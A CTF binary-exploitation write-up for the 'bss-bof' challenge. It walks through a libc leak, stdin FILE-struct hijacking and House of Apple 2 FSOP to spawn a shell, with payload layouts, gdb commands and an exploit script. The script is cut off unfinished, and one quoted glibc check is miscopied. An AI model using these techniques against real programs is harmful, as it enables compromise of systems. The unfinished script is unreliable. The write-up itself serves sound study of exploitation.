# bss-bof — CTF Binary Exploitation Writeup  

**Category:** Pwn  
**Binary:** `bss-bof` (ELF 64-bit, Ubuntu 24.04, glibc 2.39)  
**Flag:** `tkbctf{b0kug4_s4k1n1_so1v3r_w0_k4k1o3tan0n1}`  

---

## Table of Contents

1. [Challenge Overview](#1-challenge-overview)
2. [Environment Setup](#2-environment-setup)
3. [Static Analysis](#3-static-analysis)
4. [Security Mitigations](#4-security-mitigations)
5. [Vulnerability Analysis](#5-vulnerability-analysis)
6. [Exploitation Strategy — High Level](#6-exploitation-strategy--high-level)
7. [Phase 1 — Libc Leak](#7-phase-1--libc-leak)
8. [Phase 2 — Arbitrary Write: Redirecting `_IO_buf_base`](#8-phase-2--arbitrary-write-redirecting-_io_buf_base)
9. [Phase 3 — First `gets` Payload: Overwriting the stdin Struct](#9-phase-3--first-gets-payload-overwriting-the-stdin-struct)
10. [Phase 4 — Second `gets` Payload: Forging the stderr Struct](#10-phase-4--second-gets-payload-forging-the-stderr-struct)
11. [Phase 5 — Triggering the Shell via FSOP on Exit](#11-phase-5--triggering-the-shell-via-fsop-on-exit)
12. [Key Concepts Deep Dive](#12-key-concepts-deep-dive)
13. [Dynamic Analysis & Debugging Commands](#13-dynamic-analysis--debugging-commands)
14. [Complete Exploit Script](#14-complete-exploit-script)
15. [Running the Exploit](#15-running-the-exploit)

---

## 1. Challenge Overview

The challenge provides:
- `bss-bof` — stripped ELF binary
- `compose.yml` / `Dockerfile` — infrastructure (Ubuntu 24.04 jail, flag at `/flag-<md5>.txt`)
- `main.c` — source code

```c
// gcc -Wl,-z,now,-z,relro main.c -o bss-bof
#include <stdio.h>
#include <stdint.h>

char buf[8];
int main() {
  uint64_t* dest = 0;
  printf("printf: %p\n", printf);

  read(0, &dest, 8);
  read(0, dest, 8);

  gets(buf);
}

__attribute__((constructor)) void setup() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}
```

At first glance the binary looks tiny. The primitives provided are:
1. A **libc address leak** via `printf`
2. An **arbitrary 8-byte write** anywhere in memory (`read` into `dest`, then `read` into `*dest`)
3. A **BSS buffer overflow** via `gets(buf)` where `buf` is only 8 bytes in BSS

The challenge name "bss-bof" points at the `gets(buf)` overflow, but the BSS buffer is only 8 bytes and there's nothing useful adjacent to it in BSS. The real trick is abusing the gets overflow *through the stdio internals*.

---

## 2. Environment Setup

### Extract libc from Docker

```bash
# Build the Docker image
docker build -t bss-bof .

# Extract libc
docker run --rm bss-bof cat /lib/x86_64-linux-gnu/libc.so.6 > libc.so.6
docker run --rm bss-bof cat /lib64/ld-linux-x86-64.so.2 > ld-linux-x86-64.so.2
```

### Patch binary for local debugging with pwninit

```bash
pwninit --bin bss-bof --libc libc.so.6
# Produces: bss-bof_patched, solve.py stub
```

### Verify libc version

```bash
strings libc.so.6 | grep "GNU C Library"
# GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.4) stable release version 2.39.
```

### Get key libc offsets

```python
from pwn import *
libc = ELF("./libc.so.6")

print(hex(libc.sym["printf"]))         # 0x60100
print(hex(libc.sym["system"]))         # 0x58750
print(hex(libc.sym["_IO_2_1_stdin_"])) # 0x2038e0
print(hex(libc.sym["_IO_2_1_stderr_"]))# 0x2044e0
print(hex(libc.sym["_IO_wfile_jumps"]))# 0x202228
```

---

## 3. Static Analysis

### Disassembly

```
pwndbg> disassemble main
   0x401176 <main>:      endbr64
   0x40117a <main+4>:    push   rbp
   0x40117b <main+5>:    mov    rbp,rsp
   0x40117e <main+8>:    sub    rsp,0x10
   0x401182 <main+12>:   mov    QWORD PTR [rbp-0x8],0x0    ; dest = 0
   0x40118a <main+20>:   lea    rax,[rip+0x2e77]           ; &printf (GOT)
   0x401191 <main+27>:   mov    rsi,rax
   0x401194 <main+30>:   lea    rdi,[rip+0xe69]            ; "printf: %p\n"
   0x40119b <main+37>:   mov    eax,0x0
   0x4011a0 <main+42>:   call   printf
   0x4011a5 <main+47>:   lea    rax,[rbp-0x8]              ; &dest (on stack)
   0x4011a9 <main+51>:   mov    edx,0x8
   0x4011ae <main+57>:   mov    rsi,rax
   0x4011b1 <main+59>:   mov    edi,0x0
   0x4011b6 <main+65>:   call   read
   0x4011bb <main+70>:   mov    rax,QWORD PTR [rbp-0x8]   ; rax = dest
   0x4011bf <main+74>:   mov    edx,0x8
   0x4011c4 <main+80>:   mov    rsi,rax                   ; buf = dest
   0x4011c7 <main+83>:   mov    edi,0x0
   0x4011cc <main+89>:   call   read
   0x4011d1 <main+94>:   lea    rdi,[rip+0x2e88]          ; buf (BSS)
   0x4011d8 <main+101>:  call   gets
   0x4011dd <main+106>:  mov    eax,0x0
   0x4011e2 <main+112>:  leave
   0x4011e3 <main+113>:  ret
```

The binary has FULL RELRO so the GOT is read-only — the arbitrary write cannot target the GOT. There's no stack overflow (gets writes to BSS `buf`, not to the stack). There's no useful data adjacent to `buf` in BSS.

### BSS layout

```
pwndbg> info variables
0x404020  buf          (8 bytes, only BSS variable)
```

`buf` sits alone in BSS. A `gets` overflow into BSS past offset +8 hits nothing useful in the binary itself.

---

## 4. Security Mitigations

```
checksec bss-bof
    Arch:     amd64-64-little
    RELRO:    Full RELRO       ← GOT is read-only, no GOT overwrite
    Stack:    Canary found     ← No stack smashing
    NX:       NX enabled       ← No shellcode on stack/heap
    PIE:      PIE enabled      ← Binary base randomized
    SHSTK:    Enabled          ← Shadow stack (CET)
    IBT:      Enabled          ← Indirect Branch Tracking (CET)
```

Every classic mitigation is on. The path forward must go through **libc internals**.

---

## 5. Vulnerability Analysis

### The arbitrary write primitive

```c
read(0, &dest, 8);   // We control dest — can point anywhere writable
read(0, dest, 8);    // We write 8 bytes to that address
```

This gives a one-shot arbitrary 8-byte write to any writable libc address. FULL RELRO means GOT is out. But **libc BSS** (where `_IO_2_1_stdin_`, `_IO_2_1_stderr_`, `_IO_2_1_stdout_` live) is writable.

### The BSS overflow

```c
char buf[8];   // BSS
gets(buf);     // reads until '\n', no bounds check
```

`gets` is obviously unsafe. The overflow goes into BSS — but nothing useful is there. However, `gets` internally calls into **stdio** — specifically `_IO_getline` → `_IO_file_underflow` → reads from fd 0 into `stdin`'s internal buffer (`_IO_buf_base` .. `_IO_buf_end`).

**Key insight:** If we redirect `stdin->_IO_buf_base` to point at the `stdin` struct itself (using our arbitrary write), then when `gets` triggers an underflow, the data we send from fd 0 gets written *into* the `stdin` struct. We are overwriting the live stdio control structure while `gets` is reading from it.

---

## 6. Exploitation Strategy — High Level

The full exploit chain has five phases:

```
Phase 1: Leak printf address → compute libc base
Phase 2: Arbitrary write → stdin->_IO_buf_base = &stdin
Phase 3: gets payload 1 (0x84 bytes, no newline)
         → overwrite stdin struct → redirect buf_base/buf_end to stderr
Phase 4: gets payload 2 (0xe8 bytes, newline at end)
         → overwrite stderr struct → fake FILE for House of Apple 2
Phase 5: main() returns → exit() → _IO_flush_all_lockp → FSOP on stderr
         → _IO_wfile_overflow → _IO_wdoallocbuf → system("  sh;")
```

The core trick: `gets(buf)` triggers TWO underflows:
- First underflow fills stdin's buffer (which we redirected to the stdin struct itself) with payload 1
- After reading 0x84 bytes with no newline, buffer is exhausted → second underflow
- Second underflow now uses the **new** buf_base/buf_end we wrote in payload 1, filling stderr with payload 2
- Payload 2 is our forged FILE struct for House of Apple 2 FSOP

---

## 7. Phase 1 — Libc Leak

```c
printf("printf: %p\n", printf);
```

The binary prints the **GOT-resolved** address of `printf` (i.e., the actual libc address). Since FULL RELRO is enabled, GOT is resolved at load time (no lazy binding), so `printf` in GOT already holds the real libc address.

```python
r.recvuntil(b"printf: ")
printf_leak = int(r.recvline().strip(), 16)
libc.address = printf_leak - libc.sym["printf"]
# libc.sym["printf"] offset = 0x60100
```

Now we know libc base → all other symbols follow.

---

## 8. Phase 2 — Arbitrary Write: Redirecting `_IO_buf_base`

### What is `_IO_buf_base`?

`_IO_2_1_stdin_` is a global `FILE` struct in libc BSS. It has internal fields:

```c
struct _IO_FILE {
    int _flags;               // +0x00
    char *_IO_read_ptr;       // +0x08  current read position
    char *_IO_read_end;       // +0x10  end of readable data
    char *_IO_read_base;      // +0x18
    char *_IO_write_base;     // +0x20
    char *_IO_write_ptr;      // +0x28
    char *_IO_write_end;      // +0x30
    char *_IO_buf_base;       // +0x38  ← start of fd read buffer
    char *_IO_buf_end;        // +0x40  ← end of fd read buffer
    // ...
    char _shortbuf[1];        // +0x83  (1-byte inline buffer for unbuffered mode)
    _IO_lock_t *_lock;        // +0x88
    // ...
    const _IO_jump_t *vtable; // +0xd8
};
```

Because `setup()` calls `setvbuf(stdin, NULL, _IONBF, 0)` (unbuffered mode), stdin uses its `_shortbuf[1]` as the internal buffer:

```
_IO_buf_base = &stdin->_shortbuf[0] = stdin + 0x83
_IO_buf_end  = &stdin->_shortbuf[1] = stdin + 0x84  (one past the end)
```

The buffer is exactly 1 byte — stdin reads one character at a time from fd 0.

### What we do

We want to redirect the buffer so the next underflow reads into the **stdin struct itself**:

```
Desired: _IO_buf_base = &stdin   (stdin + 0x00)
         _IO_buf_end  = stdin + 0x84   (unchanged, still points to shortbuf+1)
```

Buffer size = (stdin+0x84) - (stdin+0x00) = **0x84 bytes**
This covers the entire stdin struct from `_flags` through `_shortbuf`.

### Performing the write

```python
# Step 1: set dest = address of _IO_buf_base field (stdin + 0x38)
r.send(p64(stdin + 0x38))

# Step 2: write stdin's own address into _IO_buf_base
r.send(p64(stdin))
```

After this write:
- `stdin->_IO_buf_base` = `stdin` (the struct points to itself as buffer)
- `stdin->_IO_buf_end`  = `stdin + 0x84` (unchanged — still shortbuf+1)

**Why does this work with FULL RELRO?** FULL RELRO makes the GOT read-only, but `_IO_2_1_stdin_` lives in libc's **BSS segment** which is always writable. Our arbitrary write targets `stdin + 0x38` (in libc BSS) — perfectly legal.

---

## 9. Phase 3 — First `gets` Payload: Overwriting the stdin Struct

### How `gets` triggers underflow

When `gets(buf)` is called:
1. It calls `getc_unlocked(stdin)` repeatedly
2. `getc_unlocked` checks: is `read_ptr < read_end`? If no → call `__underflow`
3. `__underflow` → `_IO_file_underflow`:

```c
// Simplified _IO_file_underflow
ssize_t _IO_file_underflow(FILE *fp) {
    // read from fd into [buf_base, buf_end)
    count = read(fp->_fileno, fp->_IO_buf_base,
                 fp->_IO_buf_end - fp->_IO_buf_base);
    fp->_IO_read_base = fp->_IO_buf_base;
    fp->_IO_read_ptr  = fp->_IO_buf_base;
    fp->_IO_read_end  = fp->_IO_buf_base + count;
    return *(unsigned char *)fp->_IO_read_ptr;
}
```

With our redirected buffer:
- `fp->_IO_buf_base` = `stdin` (the struct itself)
- `fp->_IO_buf_end`  = `stdin + 0x84`
- The syscall reads **0x84 bytes from fd 0 into the stdin struct**

Our first payload IS those 0x84 bytes. We are writing to the live struct.

### Payload 1 layout (0x84 bytes, no `\n`)

```
Offset  Field              Value              Reason
------  -----              -----              ------
+0x00   _flags             0xfbad208b         Keep stdin in valid readable state
+0x08   _IO_read_ptr       stderr             Mark buffer as empty (ptr == end)
+0x10   _IO_read_end       stderr             (so UNDERFLOW is triggered again)
+0x18   _IO_read_base      stderr
+0x20   _IO_write_base     stderr
+0x28   _IO_write_ptr      stderr
+0x30   _IO_write_end      stderr
+0x38   _IO_buf_base  ←    stderr             REDIRECT: next buffer fills stderr
+0x40   _IO_buf_end   ←    stderr + 0xe8      Buffer covers 0xe8 bytes of stderr
+0x48   _IO_save_base      0
+0x50   _IO_backup_base    0
+0x58   _IO_save_end       0
+0x60   _markers           0
+0x68   _chain             0
+0x70   _fileno            0                  fd=0 = stdin (keep reading from fd 0)
+0x74   _flags2            0
+0x78   _old_offset        0xffffffffffffffff
+0x80   _cur_column        0
+0x82   _vtable_offset     0
+0x83   _shortbuf          0
```

**Why no newline?** `gets` reads until `\n`. If there's no `\n` in the 0x84 bytes, `gets` reads all 0x84 bytes (fills stdin buffer), finds no newline, and must call underflow again to get more data.

**After gets reads these 0x84 bytes from the buffer**, `read_ptr` = `read_end` = buffer exhausted. `gets` calls underflow again. This time:
- `_IO_buf_base` = `stderr` (we just wrote this)
- `_IO_buf_end`  = `stderr + 0xe8`

The second underflow reads 0xe8 bytes from fd 0 into `stderr`. That is payload 2.

---

## 10. Phase 4 — Second `gets` Payload: Forging the stderr Struct

### Goal: House of Apple 2 FSOP

We need to craft a fake `FILE` struct at `stderr` such that when `exit()` flushes all FILE streams, it calls `system("  sh;")`.

The technique is **House of Apple 2** using `_IO_wfile_jumps` as the vtable. Let's build up why each field is set the way it is.

### Why `_IO_wfile_jumps`?

Since glibc 2.24, there is a vtable validity check in `_IO_vtable_check`:

```c
// Vtable must be within the __stop___IO_vtables ... __start___IO_vtables range
if (table < (const void *) &__stop___IO_vtables
    || table >= (const void *) &__stop___IO_vtables)
    _IO_vtable_check ();  // → abort
```

Using a fake vtable in heap/stack/BSS would fail this check. But `_IO_wfile_jumps` is a **legitimate, built-in vtable** inside glibc — it passes the range check automatically.

`_IO_wfile_jumps` is the wide-character vtable. Its `__overflow` slot points to `_IO_wfile_overflow`, which eventually calls `_IO_wdoallocbuf` → `fp->_wide_data->_wide_vtable->__doallocate(fp)`. The `_wide_vtable` pointer is inside a user-controlled data struct (`_wide_data`), **not** subject to the vtable validity check. This is the House of Apple 2 bypass.

### The call chain in detail

On `exit()`:

```
exit()
 └─ __run_exit_handlers()
     └─ _IO_cleanup()
         └─ _IO_flush_all_lockp()
             ├─ iterates _IO_list_all linked list
             ├─ for each fp: if (_mode<=0 && write_ptr > write_base) → _IO_OVERFLOW(fp, EOF)
             └─ _IO_OVERFLOW dispatches through fp->vtable->__overflow
```

With `vtable = _IO_wfile_jumps`:

```
_IO_OVERFLOW(fp, EOF)
 └─ _IO_wfile_overflow(fp, EOF)       ← from _IO_wfile_jumps.__overflow
     ├─ check: _IO_CURRENTLY_PUTTING not set OR _wide_data->_IO_write_base == NULL
     └─ _IO_wdoallocbuf(fp)
         ├─ check: _wide_data->_IO_buf_base == NULL  (proceed if NULL)
         ├─ check: NOT _IO_UNBUFFERED  (proceed if buffered)
         └─ WDOALLOCATE(fp)
             └─ fp->_wide_data->_wide_vtable->__doallocate(fp)
                 = system(fp)
                 = system("  sh;")   ← shell!
```

### Setting up the pointers

We use `stderr - 0x10` as a multipurpose anchor pointer. Here is why:

**For `_wide_data` = `stderr - 0x10`:**

The `_IO_wide_data` struct has `_wide_vtable` at offset `+0xe0`:
```
(stderr - 0x10) + 0xe0 = stderr + 0xd0
```
So `_wide_data->_wide_vtable` is the 8 bytes at `stderr + 0xd0`. We set that to `stderr - 0x10`.

**For `_wide_vtable` = `stderr - 0x10`:**

`__doallocate` is at vtable offset `+0x68`:
```
(stderr - 0x10) + 0x68 = stderr + 0x58
```
So `_wide_vtable->__doallocate` is the 8 bytes at `stderr + 0x58`. We set that to `system`.

**For `_lock` = `stderr - 0x10`:**

`_IO_flush_all_lockp` acquires the lock before flushing. The lock is a 4-byte mutex. `stderr - 0x10` is in libc BSS, initialized to 0 (unlocked). This allows the lock to be acquired cleanly.

**Summary of pointer relationships:**

```
stderr + 0x58  = system               ← _wide_vtable->__doallocate
stderr + 0x88  = stderr - 0x10        ← _lock (points to zero memory)
stderr + 0xa0  = stderr - 0x10        ← _wide_data
stderr + 0xd0  = stderr - 0x10        ← _wide_data->_wide_vtable (written in payload)
stderr + 0xd8  = _IO_wfile_jumps      ← FILE vtable
```

### Payload 2 layout (0xe8 bytes, `\n` at the end)

```
Offset  Field             Value              Reason
------  -----             -----              ------
+0x00   _flags            b"  sh;\x00\x00\x00"   system(fp) = system("  sh;")
+0x08   _IO_read_ptr      0                  Also: _wide_data->_IO_write_base = NULL ✓
+0x10   _IO_read_end      0
+0x18   _IO_read_base     0
+0x20   _IO_write_base    0                  Also: _wide_data->_IO_buf_base = NULL ✓
+0x28   _IO_write_ptr     1                  write_ptr(1) > write_base(0) → trigger OVERFLOW
+0x30   _IO_write_end     0
+0x38   _IO_buf_base      0
+0x40   _IO_buf_end       0
+0x48   _IO_save_base     0
+0x50   _IO_backup_base   0
+0x58   _IO_save_end      system             _wide_vtable->__doallocate
+0x60   _markers          0
+0x68   _chain            0                  Terminate IO list traversal at stderr
+0x70   _fileno           0
+0x74   _flags2           0
+0x78   _old_offset       0
+0x80   _cur_column       0
+0x82   _vtable_offset    0
+0x83   _shortbuf         0
+0x84   (padding)         0                  Align to 0x88
+0x88   _lock             stderr - 0x10      Writable zero memory → unlocked mutex
+0x90   _offset           0
+0x98   _codecvt          0
+0xa0   _wide_data        stderr - 0x10      Points "before" stderr as fake wide_data
+0xa8   _freeres_list     0
+0xb0   _freeres_buf      0
+0xb8   __pad5            0
+0xc0   _mode             0                  _mode <= 0 satisfies flush condition
+0xc4   _unused2[0..11]   0
+0xd0   (_wide_data->     stderr - 0x10      _wide_vtable = stderr-0x10,
         _wide_vtable)                        so __doallocate at (stderr-0x10)+0x68=stderr+0x58
+0xd8   vtable            _IO_wfile_jumps    Valid vtable, passes range check
+0xe0   (padding)         b"\x00"*7 + b"\n"  \n terminates gets
```

### Why `_flags = "  sh;"`?

When `system(fp)` is called (where `fp = stderr`), the FILE pointer is cast to `char *`. The first bytes of the struct are `_flags`. We set `_flags` to the bytes `b"  sh;\x00..."`. Cast to `char*`, this is the C string `"  sh;"`. So:

```c
system(fp) → system("  sh;") → execve("/bin/sh", ["/bin/sh", "-c", "  sh;"])
```

The leading spaces before `sh` are fine — the shell ignores leading whitespace in the command. The semicolon after `sh` is also fine. We get a shell.

### Why `_wide_data->_IO_write_base` and `_IO_buf_base` must be NULL

`_IO_wfile_overflow` checks:
```c
if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0
    || f->_wide_data->_IO_write_base == NULL)
    → call _IO_wdoallocbuf
```

`_wide_data = stderr - 0x10`, so `_wide_data->_IO_write_base` is at `(stderr-0x10)+0x18 = stderr+0x08 = payload2[0x08]` which we set to 0. ✓

`_IO_wdoallocbuf` checks:
```c
if (fp->_wide_data->_IO_buf_base)
    return 0;  // already has buffer, don't allocate
```

`_wide_data->_IO_buf_base` is at `(stderr-0x10)+0x30 = stderr+0x20 = payload2[0x20]` which we set to 0. ✓

Both checks pass, and `WDOALLOCATE` (our `system`) is called.

---

## 11. Phase 5 — Triggering the Shell via FSOP on Exit

After `gets` reads payload 2 (stopping at `\n`), `main()` returns normally. The return invokes the exit path:

1. `main()` returns with `eax = 0`
2. `__libc_start_main` calls `exit(0)`
3. `exit` calls `__run_exit_handlers`
4. `__run_exit_handlers` calls `_IO_cleanup`
5. `_IO_cleanup` calls `_IO_flush_all_lockp`

`_IO_flush_all_lockp` iterates `_IO_list_all`:

```c
fp = _IO_list_all;   // starts at stderr (head of list)
do {
    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) || ...) {
        _IO_OVERFLOW(fp, EOF);
    }
} while ((fp = fp->_chain) != NULL);
```

For our forged stderr:
- `_mode = 0` → `0 <= 0` ✓
- `_IO_write_ptr = 1 > _IO_write_base = 0` ✓
- `_IO_OVERFLOW(fp, EOF)` is called

`_IO_OVERFLOW` dispatches via `fp->vtable` = `_IO_wfile_jumps`. The `__overflow` slot of `_IO_wfile_jumps` is `_IO_wfile_overflow`.

```
_IO_wfile_overflow → _IO_wdoallocbuf → WDOALLOCATE
    → fp->_wide_data->_wide_vtable->__doallocate(fp)
    → system(fp) = system("  sh;")
```

Shell obtained. `_chain = 0` in our fake stderr stops the list traversal there, so no other streams are processed.

---

## 12. Key Concepts Deep Dive

### Q: Why can't we just overwrite the GOT?

FULL RELRO (`-Wl,-z,now,-z,relro`): all GOT entries are resolved at load time and the GOT segment is remapped read-only before `main()` runs. Any write to the GOT would segfault.

### Q: Why doesn't `gets` overflow the BSS into anything useful?

`buf` is the only variable in `.bss`. Beyond it is either padding or the end of the BSS segment. There's no adjacent function pointer or return address to overwrite.

### Q: How does the 0x84-byte buffer span the stdin struct?

After `setvbuf(stdin, NULL, _IONBF, 0)`:
- `_IO_buf_base = &_shortbuf[0] = stdin + 0x83`
- `_IO_buf_end   = &_shortbuf[1] = stdin + 0x84`

We write `stdin + 0x38` (`_IO_buf_base`) ← `stdin` (address of the struct itself). `_IO_buf_end` stays at `stdin + 0x84`. Buffer = `[stdin, stdin+0x84)` = exactly 0x84 bytes covering the whole struct.

### Q: Does the vtable validity check block us?

The check validates `fp->vtable` against the `__IO_vtables` section in libc. `_IO_wfile_jumps` IS in that section — it's a legitimate glibc vtable. The check passes. The `_wide_data->_wide_vtable` pointer is *not* checked (it's in a data struct, not the FILE vtable field).

### Q: Why `_mode = 0` and not some other value?

`_IO_flush_all_lockp` condition: `fp->_mode <= 0`. Zero satisfies `<= 0`. If `_mode` were positive (wide mode), the condition would use the wide data path instead. We want the byte-stream condition to trigger.

### Q: What is `_IO_list_all` and why does stderr get flushed?

`_IO_list_all` is a global linked list of all open FILE structs, maintained via `_chain` pointers. The head is `stderr`, which chains to `stdout`, then `stdin`. When we overwrite `stderr->_chain = 0`, only stderr is flushed. This is intentional — we don't want stdout or stdin's (now-corrupted) structs to be processed.

---

## 13. Dynamic Analysis & Debugging Commands

### Starting pwndbg

```bash
gdb -q ./bss-bof_patched
# or with pwndbg
pwndbg ./bss-bof_patched
```

### Useful pwndbg commands used during analysis

```
# Check mitigations
pwndbg> checksec

# Disassemble main
pwndbg> disassemble main
pwndbg> pdisass main        # pwndbg pretty disasm

# Run the binary
pwndbg> run

# Break at gets call
pwndbg> break *main+101
pwndbg> run

# Inspect stdin FILE struct before our write
pwndbg> p *_IO_2_1_stdin_
pwndbg> telescope &_IO_2_1_stdin_ 30

# Check _IO_buf_base and _IO_buf_end offsets
pwndbg> p &((_IO_FILE *)&_IO_2_1_stdin_)->_IO_buf_base
pwndbg> p &((_IO_FILE *)&_IO_2_1_stdin_)->_IO_buf_end

# After Phase 2 write: verify _IO_buf_base was redirected
pwndbg> x/gx &_IO_2_1_stdin_+0x38

# View full libc memory map
pwndbg> vmmap libc

# Find _IO_wfile_jumps address
pwndbg> p &_IO_wfile_jumps
pwndbg> x/20gx &_IO_wfile_jumps

# Check _IO_list_all head
pwndbg> p _IO_list_all
pwndbg> p *_IO_list_all         # should be stderr

# Inspect stderr struct
pwndbg> p *_IO_2_1_stderr_
pwndbg> telescope &_IO_2_1_stderr_ 30

# After payload 2: verify forged stderr
pwndbg> telescope &_IO_2_1_stderr_ 30

# Break at _IO_flush_all_lockp to watch FSOP trigger
pwndbg> break _IO_flush_all_lockp
pwndbg> break _IO_wfile_overflow
pwndbg> break _IO_wdoallocbuf

# Step through the FSOP chain
pwndbg> continue
pwndbg> next
pwndbg> finish

# Check what's at _wide_data->_wide_vtable->__doallocate
pwndbg> p/x ((struct _IO_wide_data *)(_IO_2_1_stderr_._wide_data))->_wide_vtable
pwndbg> x/gx ((char*)_IO_2_1_stderr_._wide_data + 0xe0)

# Dump registers at WDOALLOCATE call
pwndbg> info registers rdi rip

# Cyclic pattern for overflow research (not needed here but useful reference)
pwndbg> cyclic 100
pwndbg> cyclic -l 0x61616161

# Search for system in memory
pwndbg> search -t qword system
pwndbg> p system
```

### Verifying key offsets in gdb

```bash
# Confirm _IO_buf_base offset = 0x38
pwndbg> python print(hex(pwndbg.gdblib.typeinfo.load('_IO_FILE')['_IO_buf_base'].bitpos // 8))

# Confirm _wide_vtable offset in _IO_wide_data = 0xe0
pwndbg> python print(hex(pwndbg.gdblib.typeinfo.load('_IO_wide_data')['_wide_vtable'].bitpos // 8))

# Alternative: use offsetof in GDB
pwndbg> p (int)&((_IO_FILE *)0)->_IO_buf_base
# $1 = 56  (0x38) ✓

pwndbg> p (int)&((_IO_wide_data *)0)->_wide_vtable
# $1 = 224 (0xe0) ✓
```

### Setting up the exploit locally for debugging

```bash
# Run with GDB attached (add GDB flag to solve.py)
python3 solve.py LOCAL GDB

# Or use pwntools gdb.attach inside solve.py:
#   r = process([exe.path])
#   gdb.attach(r, '''
#       break _IO_wfile_overflow
#       break _IO_wdoallocbuf
#       continue
#   ''')
```

### Verifying the exploit works locally

```bash
python3 solve.py LOCAL
# [*] libc base: 0x7f...
# [*] Switching to interactive mode
$ id
uid=1000(user) ...
$ cat /flag*.txt
tkbctf{...}
```

---

## 14. Complete Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./bss-bof_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "info"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("34.170.146.252", PORT)
    return r


def main():
    r = conn()

    # ─────────────────────────────────────────────
    # Phase 1: Leak libc base
    # ─────────────────────────────────────────────
    r.recvuntil(b"printf: ")
    printf_leak = int(r.recvline().strip(), 16)
    libc.address = printf_leak - libc.sym["printf"]
    log.info(f"libc base:       {hex(libc.address)}")

    stdin           = libc.sym["_IO_2_1_stdin_"]
    stderr          = libc.sym["_IO_2_1_stderr_"]
    system          = libc.sym["system"]
    _IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]

    log.info(f"stdin:           {hex(stdin)}")
    log.info(f"stderr:          {hex(stderr)}")
    log.info(f"system:          {hex(system)}")
    log.info(f"_IO_wfile_jumps: {hex(_IO_wfile_jumps)}")

    # ─────────────────────────────────────────────
    # Phase 2: Arbitrary write — stdin->_IO_buf_base = &stdin
    # After this, stdin's read buffer covers [stdin, stdin+0x84),
    # i.e., the next underflow will write 0x84 bytes into the stdin struct.
    # ─────────────────────────────────────────────
    r.send(p64(stdin + 0x38))   # dest = &stdin->_IO_buf_base
    r.send(p64(stdin))          # *dest = stdin  (buf_base now points at itself)

    # ─────────────────────────────────────────────
    # Phase 3: First gets payload (0x84 bytes, NO newline)
    # Written into stdin struct by the first underflow.
    # Key: sets buf_base = stderr, buf_end = stderr+0xe8
    # so the SECOND underflow fills stderr with our payload.
    # ─────────────────────────────────────────────
    payload1  = p64(0xfbad208b)           # +0x00 _flags
    payload1 += p64(stderr)               # +0x08 _IO_read_ptr
    payload1 += p64(stderr)               # +0x10 _IO_read_end   (ptr==end → empty)
    payload1 += p64(stderr)               # +0x18 _IO_read_base
    payload1 += p64(stderr)               # +0x20 _IO_write_base
    payload1 += p64(stderr)               # +0x28 _IO_write_ptr
    payload1 += p64(stderr)               # +0x30 _IO_write_end
    payload1 += p64(stderr)               # +0x38 _IO_buf_base → redirect to stderr
    payload1 += p64(stderr + 0xe8)        # +0x40 _IO_buf_end   → stderr + 0xe8
    payload1 += p64(0)                    # +0x48 _IO_save_base
    payload1 += p64(0)                    # +0x50 _IO_backup_base
    payload1 += p64(0)                    # +0x58 _IO_save_end
    payload1 += p64(0)                    # +0x60 _markers
    payload1 += p64(0)                    # +0x68 _chain
    payload1 += p32(0)                    # +0x70 _fileno (fd=0)
    payload1 += p32(0)                    # +0x74 _flags2
    payload1 += p64(0xffffffffffffffff)   # +0x78 _old_offset
    payload1 += p16(0)                    # +0x80 _cur_column
    payload1 += p8(0)                     # +0x82 _vtable_offset
    payload1 += p8(0)                     # +0x83 _shortbuf
    assert len(payload1) == 0x84
    r.send(payload1)

    # ─────────────────────────────────────────────
    # Phase 4: Second gets payload (0xe8 bytes, \n at end)
    # Written into stderr struct by the second underflow.
    # Forged FILE struct for House of Apple 2 FSOP via _IO_wfile_jumps.
    #
    # Pointer relationships:
    #   stderr+0x58 = system        ← _wide_vtable->__doallocate
    #   stderr+0x88 = stderr-0x10   ← _lock (BSS zero memory)
    #   stderr+0xa0 = stderr-0x10   ← _wide_data
    #   stderr+0xd0 = stderr-0x10   ← _wide_data->_wide_vtable
    #   stderr+0xd8 = _IO_wfile_jumps ← FILE vtable (passes validity check)
    # ─────────────────────────────────────────────
    payload2  = b"  sh;\x00\x00\x00"      # +0x00 _flags  → system(fp)="system("  sh;")"
    payload2 += p64(0)                     # +0x08 _IO_read_ptr (= _wide_data->_IO_write_base=0)
    payload2 += p64(0)                     # +0x10 _IO_read_end
    payload2 += p64(0)                     # +0x18 _IO_read_base
    payload2 += p64(0)                     # +0x20 _IO_write_base=0 (= _wide_data->_IO_buf_base=0)
    payload2 += p64(1)                     # +0x28 _IO_write_ptr=1 > write_base=0 → OVERFLOW
    payload2 += p64(0)                     # +0x30 _IO_write_end
    payload2 += p64(0)                     # +0x38 _IO_buf_base
    payload2 += p64(0)                     # +0x40 _IO_buf_end
    payload2 += p64(0)                     # +0x48 _IO_save_base
    payload2 += p64(0)                     # +0x50 _IO_backup_base
    payload2 += p64(system)                # +0x58 → fake _wide_vtable->__doallocate = system
    payload2 += p64(0)                     # +0x60 _markers
    payload2 += p64(0)                     # +0x68 _chain=0 (stop IO list here)
    payload2 += p32(0)                     # +0x70 _fileno
    payload2 += p32(0)                     # +0x74 _flags2
    payload2 += p64(0)                     # +0x78 _old_offset
    payload2 += p16(0)                     # +0x80 _cur_column
    payload2 += p8(0)                      # +0x82 _vtable_offset
    payload2 += p8(0)                      # +0x83 _shortbuf
    payload2 += p32(0)                     # +0x84 padding → align to 0x88
    payload2 += p64(stderr - 0x10)         # +0x88 _lock
    payload2 += p64(0)                     # +0x90 _offset
    payload2 += p64(0)                     # +0x98 _codecvt
    payload2 += p64(stderr - 0x10)         # +0xa0 _wide_data
    payload2 += p64(0)                     # +0xa8 _freeres_list
    payload2 += p64(0)                     # +0xb0 _freeres_buf
    payload2 += p64(0)                     # +0xb8 __pad5
    payload2 += p32(0)                     # +0xc0 _mode=0 (satisfies _mode<=0 check)
    payload2 += b"\x00" * 12              # +0xc4 _unused2 first 12 bytes
    payload2 += p64(stderr - 0x10)         # +0xd0 = _wide_data->_wide_vtable
